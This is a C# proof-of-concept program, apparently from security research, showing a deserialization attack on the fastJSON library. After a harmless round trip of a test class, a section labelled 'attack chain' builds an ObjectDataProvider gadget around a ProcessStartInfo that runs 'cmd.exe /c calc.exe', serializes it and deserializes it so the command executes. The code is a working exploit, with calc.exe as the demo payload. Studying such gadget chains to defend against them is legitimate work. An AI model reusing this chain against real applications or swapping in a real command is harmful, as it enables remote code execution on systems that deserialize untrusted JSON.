using System.Collections.Specialized;
using System.Reflection;
using System.Runtime.Serialization;
using System.Diagnostics;
using System;

namespace fastjson
{
    class Program
    {
        static void Main(string[] args)
        {
            TestClass testClass = new TestClass();
            testClass.Name = "mmadneal";
            testClass.Classname = "neal";
            testClass.Age = 18;
            JSONParameters jsonParameters = new JSONParameters
            {
                UseExtension = true,
            };
            var instance = JSON.ToJSON(testClass, jsonParameters);
            Console.WriteLine(instance);

            JSONParameters jsonParameters1 = new JSONParameters
            {
                UseExtension = true,
            };
            var instance1 = JSON.ToObject<Object>(instance, jsonParameters);
            Type t = instance1.GetType();
            PropertyInfo property = t.GetProperty("Name");
            Object obj = property.GetValue(instance1, null);
            Console.WriteLine(obj);

            // 攻击链
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c calc.exe";
            StringDictionary dict = new StringDictionary();
            processStartInfo.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).
                SetValue(processStartInfo, dict);
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = processStartInfo;
            JSONParameters s = new JSONParameters
            {

            };
            s.IgnoreAttributes.Add(typeof(IntPtr));
            string content = JSON.ToJSON(odp, s);

            var instance2 = JSON.ToObject(content);
            Console.WriteLine(instance2);
        }
    }

    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        public string Classname { get => classname; set => classname = value; }
        public string Name { get => name; set => name = value; }
        public int Age { get => age; set => age = value; }
        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string value)
        {
            Process.Start(value);
        }
    }
}
